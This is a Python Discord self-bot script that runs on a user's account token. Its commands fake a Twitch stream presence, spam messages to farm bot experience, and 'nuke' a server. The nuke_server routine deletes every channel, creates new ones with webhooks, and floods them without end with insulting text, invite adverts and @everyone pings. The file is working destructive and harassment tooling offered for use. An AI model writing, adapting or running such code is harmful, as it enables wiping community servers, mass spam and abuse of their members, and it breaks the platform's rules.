import requests
import time
import random
import signal
import sys
import threading
import json
import string
from datetime import datetime
import pytz

try:
    import websocket
except ImportError:
    websocket = None


def get_vn_time():
    tz = pytz.timezone("Asia/Ho_Chi_Minh")
    now = datetime.now(tz)
    return now


def replace_placeholders(text):
    if not text:
        return text
    now = get_vn_time()
    text = text.replace("{date}", now.strftime("%d/%m/%Y"))
    text = text.replace("{time}", now.strftime("%H:%M"))
    return text


def check_token(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if response.status_code == 200:
        data = response.json()
        username = data.get("username")
        discriminator = data.get("discriminator")
        user_id = data.get("id")
        if discriminator and discriminator != "0":
            return f"{username}#{discriminator}", user_id
        return username, user_id
    return None, None


def get_current_custom_status(token):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    response = requests.get("https://discord.com/api/v9/users/@me/settings", headers=headers)
    if response.status_code == 200:
        return response.json().get("custom_status", None)
    return None


def change_custom_status(token, text):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"custom_status": {"text": text}}
    try:
        r = requests.patch(
            "https://discord.com/api/v9/users/@me/settings",
            headers=headers,
            json=payload,
            timeout=10
        )
        if r.status_code == 429:
            retry = r.json().get("retry_after", 1)
            time.sleep(retry)
            requests.patch(
                "https://discord.com/api/v9/users/@me/settings",
                headers=headers,
                json=payload,
                timeout=10
            )
    except requests.RequestException:
        pass


def restore_custom_status(token, original):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    payload = {"custom_status": original}
    try:
        requests.patch(
            "https://discord.com/api/v9/users/@me/settings",
            headers=headers,
            json=payload,
            timeout=10
        )
    except requests.RequestException:
        pass


def delete_message(token, channel_id, message_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, timeout=10
        )
    except requests.RequestException:
        pass


def edit_message(token, channel_id, message_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        requests.patch(
            f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}",
            headers=headers, json={"content": content}, timeout=10
        )
    except requests.RequestException:
        pass


def send_message(token, channel_id, content):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/messages",
            headers=headers, json={"content": content}, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("id")
    except requests.RequestException:
        pass
    return None


def get_channel_info(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def load_config():
    config = {}
    with open("config.txt", "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if "=" in line:
                key, value = line.split("=", 1)
                config[key.strip()] = value.strip()
    return config


def load_custom_statuses():
    try:
        with open("customstatus.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f if line.strip()]
        return lines
    except FileNotFoundError:
        return []


def load_stream_config():
    config = {}
    try:
        with open("stream.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and "=" in line:
                    key, value = line.split("=", 1)
                    config[key.strip()] = value.strip()
    except FileNotFoundError:
        return None

    errors = []
    if not config.get("button1_label"):
        errors.append("Cannot find button1_label in stream.txt")
    if not config.get("button1_url"):
        errors.append("Cannot find button1_url in stream.txt")
    if not config.get("button2_label"):
        errors.append("Cannot find button2_label in stream.txt")
    if not config.get("button2_url"):
        errors.append("Cannot find button2_url in stream.txt")

    if errors:
        for e in errors:
            print(e)
        return None

    return config


SMALL_IMAGE_URL = "https://media.tenor.com/oJwNPShUJnwAAAAj/discord-verification-verification.gif"


def register_asset(token, app_id, url):
    try:
        headers = {"Authorization": token, "Content-Type": "application/json"}
        r = requests.post(
            f"https://discord.com/api/v9/applications/{app_id}/external-assets",
            headers=headers,
            json={"urls": [url]},
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            if data and len(data) > 0:
                path = data[0].get("external_asset_path", "")
                if path:
                    return f"mp:{path}"
    except Exception:
        pass
    return url


def preload_assets(token, app_id, image_url):
    cache = {}
    loaded = 0

    resolved_large = register_asset(token, app_id, image_url)
    cache["large"] = resolved_large
    if resolved_large.startswith("mp:"):
        loaded += 1

    resolved_small = register_asset(token, app_id, SMALL_IMAGE_URL)
    cache["small"] = resolved_small
    if resolved_small.startswith("mp:"):
        loaded += 1

    print(f"[*] Loaded {loaded} image")
    return cache


def build_activity_from_slot(sc, slot, app_id, asset_cache, start_time):
    if slot == 1:
        line1 = replace_placeholders(sc.get("line1", "") or "")
        line2 = replace_placeholders(sc.get("line2", "") or "")
        line3 = replace_placeholders(sc.get("line3", "") or "")
        btn1_label = replace_placeholders(sc.get("button1_label", "") or "")
        btn1_url = sc.get("button1_url", "")
        btn2_label = replace_placeholders(sc.get("button2_label", "") or "")
        btn2_url = sc.get("button2_url", "")
    else:
        line1 = replace_placeholders(sc.get("line1_2", "") or sc.get("line1", "") or "")
        line2 = replace_placeholders(sc.get("line2_2", "") or sc.get("line2", "") or "")
        line3 = replace_placeholders(sc.get("line3_2", "") or sc.get("line3", "") or "")
        btn1_label = replace_placeholders(sc.get("button1_label_2", "") or sc.get("button1_label", "") or "")
        btn1_url = sc.get("button1_url_2", "") or sc.get("button1_url", "")
        btn2_label = replace_placeholders(sc.get("button2_label_2", "") or sc.get("button2_label", "") or "")
        btn2_url = sc.get("button2_url_2", "") or sc.get("button2_url", "")

    activity = {
        "type": 1,
        "name": "Twitch",
        "url": "https://www.twitch.tv/tuanhaidz",
        "timestamps": {"start": start_time},
        "buttons": [btn1_label, btn2_label],
        "metadata": {
            "button_urls": [btn1_url, btn2_url]
        }
    }

    if line1:
        activity["details"] = line1
    if line2:
        activity["state"] = line2

    activity["assets"] = {
        "large_image": asset_cache.get("large", ""),
        "large_text": line3 if line3 else "",
        "small_image": asset_cache.get("small", ""),
        "small_text": line3 if line3 else ""
    }

    if app_id:
        activity["application_id"] = app_id

    return activity


RANDOM_EMOJIS = ["😂", "🔥", "💀", "😭", "🐧", "🌸", "💯", "🎉", "😎", "🤡", "👾", "🫡", "🥶", "🤣", "😈"]


def random_farm_message():
    chars = random.choices(string.ascii_lowercase + string.digits, k=10)
    random_str = "".join(chars)
    emojis = "".join(random.choices(RANDOM_EMOJIS, k=5))
    return f"tuanhaidz {random_str} {emojis}"


def farm_loop(token, channel_id, stop_event):
    while not stop_event.is_set():
        for _ in range(4):
            if stop_event.is_set():
                return
            send_message(token, channel_id, random_farm_message())
            time.sleep(0.5)
        stop_event.wait(5)


def resolve_invite(token, invite_code):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_channels(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json()
    except requests.RequestException:
        pass
    return None


def get_guild_name(token, guild_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.get(
            f"https://discord.com/api/v9/guilds/{guild_id}",
            headers=headers, timeout=10
        )
        if r.status_code == 200:
            return r.json().get("name", "Unknown")
    except requests.RequestException:
        pass
    return "Unknown"


def delete_channel(token, channel_id):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.delete(
            f"https://discord.com/api/v9/channels/{channel_id}",
            headers=headers, timeout=10
        )
        return r.status_code in (200, 204)
    except requests.RequestException:
        return False


def create_channel(token, guild_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{guild_id}/channels",
            headers=headers, json={"name": name, "type": 0}, timeout=10
        )
        if r.status_code in (200, 201):
            return r.json()
    except requests.RequestException:
        pass
    return None


def create_webhook(token, channel_id, name):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    try:
        r = requests.post(
            f"https://discord.com/api/v9/channels/{channel_id}/webhooks",
            headers=headers, json={"name": name}, timeout=10
        )
        if r.status_code in (200, 201):
            data = r.json()
            return f"https://discord.com/api/webhooks/{data['id']}/{data['token']}"
    except requests.RequestException:
        pass
    return None


def spam_webhook(url, content):
    while True:
        try:
            r = requests.post(url, json={"content": content}, timeout=10)
            if r.status_code == 404:
                break
            if r.status_code == 429:
                retry = r.json().get("retry_after", 0.1)
                time.sleep(retry)
        except requests.RequestException:
            break


def nuke_server(token, guild_id, ad_invite):
    print("[*] Nuking server...")

    spam_content = (
        "# your trash server got fucked by tuanhai dz 😭😂cry and report it to your mom\n"
        "# tuanhai on top | little rat cry now 😂\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        f"{ad_invite}\n"
        "@everyone"
    )

    channel_names = ["".join(random.choices(string.ascii_lowercase + string.digits, k=20)) for _ in range(6)]
    create_index = [0]
    lock = threading.Lock()
    spam_threads = []

    def delete_all_channels():
        channels = get_guild_channels(token, guild_id)
        if channels:
            for ch in channels:
                delete_channel(token, ch["id"])
        print("[+] Deleted all channels")

    def create_and_spam():
        while True:
            with lock:
                if create_index[0] >= len(channel_names):
                    break
                idx = create_index[0]
                create_index[0] += 1
            name = channel_names[idx]
            ch = create_channel(token, guild_id, name)
            if ch:
                print(f"[+] Created #{name}")
                wh = create_webhook(token, ch["id"], "tuanhaideptrai")
                if wh:
                    print(f"[+] Webhook created in #{name}")
                    t = threading.Thread(target=spam_webhook, args=(wh, spam_content), daemon=True)
                    t.start()
                    spam_threads.append(t)

    delete_thread = threading.Thread(target=delete_all_channels, daemon=True)
    delete_thread.start()

    create_threads = []
    for _ in range(3):
        t = threading.Thread(target=create_and_spam, daemon=True)
        t.start()
        create_threads.append(t)

    delete_thread.join()
    for t in create_threads:
        t.join()
    for t in spam_threads:
        t.join()

    print("[+] Nuke completed")


class DiscordGateway:
    def __init__(self, token, user_id, activity=None, stream_config=None, app_id=None,
                 auto_change_stream=False, asset_cache=None, start_time=None):
        self.token = token
        self.user_id = user_id
        self.activity = activity
        self.stream_config = stream_config
        self.app_id = app_id
        self.auto_change_stream = auto_change_stream
        self.asset_cache = asset_cache or {}
        self.start_time = start_time or int(time.time()) - 99999
        self.ws = None
        self.heartbeat_interval = None
        self.sequence = None
        self.running = True
        self.current_voice = None
        self.pending_live = None
        self.session_id = None
        self.farm_stop_event = None
        self.farm_thread = None
        self.farm_channel = None
        self.stream_slot = 1
        self.stream_lock = threading.Lock()

    def start(self):
        t = threading.Thread(target=self._run, daemon=True)
        t.start()
        if self.auto_change_stream and self.stream_config:
            t2 = threading.Thread(target=self._stream_rotate_loop, daemon=True)
            t2.start()

    def _stream_rotate_loop(self):
        while self.running:
            time.sleep(8)
            if not self.running:
                break
            with self.stream_lock:
                self.stream_slot = 2 if self.stream_slot == 1 else 1
                activity = build_activity_from_slot(
                    self.stream_config,
                    self.stream_slot,
                    self.app_id,
                    self.asset_cache,
                    self.start_time
                )
                self.activity = activity
            self._update_presence()

    def _update_presence(self):
        try:
            if self.ws and self.running:
                payload = {
                    "op": 3,
                    "d": {
                        "activities": [self.activity] if self.activity else [],
                        "status": "online",
                        "since": 0,
                        "afk": False
                    }
                }
                self.ws.send(json.dumps(payload))
        except Exception:
            pass

    def _run(self):
        while self.running:
            try:
                self.ws = websocket.WebSocket()
                self.ws.connect("wss://gateway.discord.gg/?v=9&encoding=json")
                hello = json.loads(self.ws.recv())
                self.heartbeat_interval = hello["d"]["heartbeat_interval"] / 1000
                t = threading.Thread(target=self._heartbeat, daemon=True)
                t.start()
                self._identify()
                while self.running:
                    msg = self.ws.recv()
                    if msg:
                        data = json.loads(msg)
                        if data.get("s"):
                            self.sequence = data["s"]
                        self._handle_event(data)
            except Exception:
                if self.running:
                    time.sleep(5)

    def _heartbeat(self):
        while self.running:
            try:
                time.sleep(self.heartbeat_interval)
                if self.ws and self.running:
                    self.ws.send(json.dumps({"op": 1, "d": self.sequence}))
            except:
                break

    def _identify(self):
        payload = {
            "op": 2,
            "d": {
                "token": self.token,
                "properties": {
                    "os": "windows",
                    "browser": "Discord Client",
                    "device": ""
                },
                "presence": {
                    "activities": [self.activity] if self.activity else [],
                    "status": "online",
                    "since": 0,
                    "afk": False
                }
            }
        }
        self.ws.send(json.dumps(payload))

    def join_voice(self, guild_id, channel_id):
        try:
            self.pending_live = {"guild_id": guild_id, "channel_id": channel_id}
            payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True
                }
            }
            self.ws.send(json.dumps(payload))
            self.current_voice = {"guild_id": guild_id, "channel_id": channel_id}
            return True
        except:
            self.pending_live = None
            return False

    def start_fake_live(self, guild_id, channel_id):
        try:
            payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                    "self_stream": True,
                    "self_video": False
                }
            }
            self.ws.send(json.dumps(payload))

            stream_payload = {
                "op": 18,
                "d": {
                    "type": "guild",
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "preferred_region": "singapore"
                }
            }
            self.ws.send(json.dumps(stream_payload))

            time.sleep(0.5)

            video_payload = {
                "op": 4,
                "d": {
                    "guild_id": guild_id,
                    "channel_id": channel_id,
                    "self_mute": True,
                    "self_deaf": True,
                    "self_stream": True,
                    "self_video": True
                }
            }
            self.ws.send(json.dumps(video_payload))
        except:
            pass

    def _handle_event(self, data):
        event = data.get("t")
        d = data.get("d")
        if not d:
            return

        if event == "READY":
            self.session_id = d.get("session_id")

        if event == "VOICE_STATE_UPDATE":
            if d.get("user_id") == self.user_id:
                if d.get("channel_id") and self.pending_live:
                    guild_id = self.pending_live["guild_id"]
                    channel_id = self.pending_live["channel_id"]
                    self.pending_live = None
                    self.start_fake_live(guild_id, channel_id)
                if not d.get("channel_id") and self.current_voice:
                    print("[*] Left voice channel.")
                    self.current_voice = None
                    self.pending_live = None

        if event == "MESSAGE_CREATE":
            author = d.get("author", {})
            if author.get("id") != self.user_id:
                return
            content = d.get("content", "").strip()
            channel_id = d.get("channel_id")
            message_id = d.get("id")
            guild_id = d.get("guild_id")

            if content == "$menu":
                menu_content = (
                    f"## Super Self Bot - Tuan Hai\n\n"
                    f"**🛠️ Commands** :\n"
                    f"`$voice [channel id]` : Join Voice Channel and Keep it online\n"
                    f"`$farm` : Spam Message to get exp for OWO or another bot\n"
                    f"`$nuke [invite]` : Nuke the server\n\n"
                    f"<@{self.user_id}>"
                )
                edit_message(self.token, channel_id, message_id, menu_content)

            elif content == "$farm":
                delete_message(self.token, channel_id, message_id)
                if self.farm_thread and self.farm_thread.is_alive():
                    self.farm_stop_event.set()
                    self.farm_thread.join()
                    self.farm_stop_event = None
                    self.farm_thread = None
                    self.farm_channel = None
                    print("[+] Stopped Farm")
                else:
                    self.farm_stop_event = threading.Event()
                    self.farm_channel = channel_id
                    self.farm_thread = threading.Thread(
                        target=farm_loop,
                        args=(self.token, channel_id, self.farm_stop_event),
                        daemon=True
                    )
                    self.farm_thread.start()
                    print("[+] Started Farm")

            elif content.startswith("$nuke "):
                delete_message(self.token, channel_id, message_id)

                if not guild_id:
                    print("Cannot nuke in DM")
                    return

                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    print("Cannot find invite")
                    return

                invite_input = parts[1].strip()
                invite_code = invite_input.replace("https://discord.gg/", "").replace("https://discord.com/invite/", "").replace("discord.gg/", "")

                invite_data = resolve_invite(self.token, invite_code)
                if not invite_data:
                    print(f"Cannot find invite {invite_input}")
                    return

                ad_invite = f"https://discord.gg/{invite_code}"

                channels = get_guild_channels(self.token, guild_id)
                if channels is None:
                    print("Cannot access this server (missing permissions)")
                    return

                guild_name = get_guild_name(self.token, guild_id)
                print(f"[+] Nuking {guild_name} ({guild_id})")
                t = threading.Thread(
                    target=nuke_server,
                    args=(self.token, guild_id, ad_invite),
                    daemon=True
                )
                t.start()

            elif content.startswith("$voice "):
                delete_message(self.token, channel_id, message_id)
                parts = content.split(" ", 1)
                if len(parts) < 2 or not parts[1].strip():
                    return

                voice_channel_id = parts[1].strip()

                if not guild_id:
                    return

                channel_info = get_channel_info(self.token, voice_channel_id)
                if not channel_info:
                    print(f"Cannot find channel {voice_channel_id}")
                    return

                if channel_info.get("type") not in (2, 13):
                    print(f"Cannot find voice channel {voice_channel_id}")
                    return

                if channel_info.get("guild_id") != guild_id:
                    print(f"Cannot find channel {voice_channel_id} in this server")
                    return

                channel_name = channel_info.get("name", "Unknown")

                if self.join_voice(guild_id, voice_channel_id):
                    print(f"[+] Joined voice: {channel_name} ({voice_channel_id})")

    def stop(self):
        if self.farm_stop_event:
            self.farm_stop_event.set()
        self.running = False
        try:
            if self.ws:
                self.ws.close()
        except:
            pass


def custom_status_loop(token, custom_texts):
    index = 0
    while True:
        change_custom_status(token, custom_texts[index])
        index = (index + 1) % len(custom_texts)
        time.sleep(1)


def main():
    config = load_config()

    token = config.get("token", "")
    if not token:
        print("Cannot find token in config.txt")
        return

    account_name, user_id = check_token(token)
    if not account_name:
        print("Invalid Token!")
        return

    auto_custom = config.get("autochangecustomstatus", "False").lower() == "true"
    stream_enabled = config.get("stream", "False").lower() == "true"
    auto_change_stream = config.get("autochangestream", "False").lower() == "true"
    app_id = config.get("application_id", "")

    custom_texts = []
    if auto_custom:
        custom_texts = load_custom_statuses()
        if len(custom_texts) <= 1:
            print("Cannot find enough lines in customstatus.txt (need at least 2)")
            auto_custom = False

    if websocket is None:
        print("Cannot find websocket-client (pip install websocket-client)")
        return

    activity = None
    sc = None
    asset_cache = {}
    start_time = int(time.time()) - 99999

    if stream_enabled:
        if not app_id:
            print("Cannot find application_id in config.txt")
            stream_enabled = False
        else:
            sc = load_stream_config()
            if sc is None:
                stream_enabled = False
            else:
                if not sc.get("line1"):
                    print("Cannot find line1 in stream.txt")
                    stream_enabled = False
                else:
                    image_url = sc.get("image_url", "")
                    asset_cache = preload_assets(token, app_id, image_url)
                    activity = build_activity_from_slot(sc, 1, app_id, asset_cache, start_time)

    print(f"[*] Connected | {account_name}")
    if stream_enabled:
        print(f"[*] Loaded 2 image")

    gateway = DiscordGateway(
        token, user_id, activity,
        stream_config=sc if stream_enabled else None,
        app_id=app_id if stream_enabled else None,
        auto_change_stream=auto_change_stream if stream_enabled else False,
        asset_cache=asset_cache,
        start_time=start_time
    )
    gateway.start()

    original_custom = get_current_custom_status(token) if auto_custom else None

    def restore(sig, frame):
        gateway.stop()
        if auto_custom:
            restore_custom_status(token, original_custom)
        sys.exit(0)

    signal.signal(signal.SIGINT, restore)

    if auto_custom:
        custom_status_loop(token, custom_texts)
    else:
        while True:
            time.sleep(1)


if __name__ == "__main__":
    main()